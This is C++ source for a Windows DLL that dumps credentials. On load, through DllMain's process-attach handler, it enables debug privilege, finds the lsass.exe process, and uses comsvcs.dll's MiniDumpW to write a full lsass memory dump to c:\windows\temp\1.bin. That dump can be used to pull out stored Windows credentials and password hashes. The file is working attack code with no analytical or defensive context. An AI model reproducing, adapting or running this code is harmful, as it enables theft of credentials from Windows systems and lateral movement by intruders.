#include <cstdio>
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <string>  
#include <map>  
#include <windows.h>
#pragma comment(lib,"Dbghelp.lib")
using namespace std;

int FindPID()
{
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(pe32);

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        cout << "CreateToolhelp32Snapshot Error!" << endl;;
        return -1;
    }

    BOOL bResult = Process32First(hProcessSnap, &pe32);

    while (bResult)
    {
        if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0)
        {
            return pe32.th32ProcessID;
        }
        bResult = Process32Next(hProcessSnap, &pe32);
    }

    CloseHandle(hProcessSnap);

    return -1;
}
typedef HRESULT(WINAPI* _MiniDumpW)(
    DWORD arg1, DWORD arg2, PWCHAR cmdline);

typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
    ULONG Privilege, BOOL Enable,
    BOOL CurrentThread, PULONG Enabled);

int dump() {
    HRESULT             hr;
    _MiniDumpW          MiniDumpW;
    _RtlAdjustPrivilege RtlAdjustPrivilege;
    ULONG               t;

    MiniDumpW = (_MiniDumpW)GetProcAddress(
        LoadLibrary(L"comsvcs.dll"), "MiniDumpW");

    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(
        GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");

    if (MiniDumpW == NULL) {

        return 0;
    }
    // try enable debug privilege
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    int pid = FindPID();
    if (pid > 0) {
        wchar_t  ws[100];
        //swprintf(ws, 100, L"%hs", "1008 C:\\windows\\temp\\1.bin full"); //784是lsass进程的pid号  "<pid> <dump.bin> full" 
        //swprintf(ws, 100, L"%d %hs",488,"c:\\windows\\temp\\1.bin full");
        swprintf(ws, 100, L"%d %hs", pid, "c:\\windows\\temp\\1.bin full");
        MiniDumpW(0, 0, ws);
        return 0;
    }
    return -1;

}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    //dump();
    try {
        switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            dump();
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
    }
    catch (bad_alloc& e) {
        return FALSE;
    }
    return TRUE;
}